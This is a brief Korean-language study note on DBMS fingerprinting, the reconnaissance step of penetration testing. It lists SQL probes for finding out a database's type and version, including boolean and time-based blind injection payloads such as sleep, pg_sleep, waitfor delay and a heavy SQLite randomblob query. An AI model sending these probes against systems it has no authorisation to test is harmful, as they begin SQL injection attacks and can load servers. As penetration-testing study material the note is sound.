## DBMS Fingerprinting
### DBMS Fingertpriting
---
#### Fingerprinting
모의 해킹은 **Penetration Testing Execution Standard**에 의하면 총 일곱 단계로 구성된다. 그 중 첫단계인 대상의 정보를 수집하는 과정을 fingerprinting라고 한다. DBMS는 용도와 목적에 따라 종류가 다양하므로, 제일 먼저 종류와 버전을 알아내야 한다. 
- 버전 출력
```sql
SELECT @@version
SELECT version()
```
- 에러 메시지 출력
```sql
select 1 union select 1,2;
```
- 참 또는 거짓 출력
```sql
mid(@@version, 1, 1)='5';
substr(version(), 1, 1)='P';
```
- 예외상황
```sql
sleep(10)
pg_sleep(10) # PostgreSQL
select 1 where substring(@@version, 1, 1)='M' and waitfor delay '0:0:5'; # MSSQL
select case when substr(sqlite_version(), 1 , 1)='3' then
LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end; # SQLite
```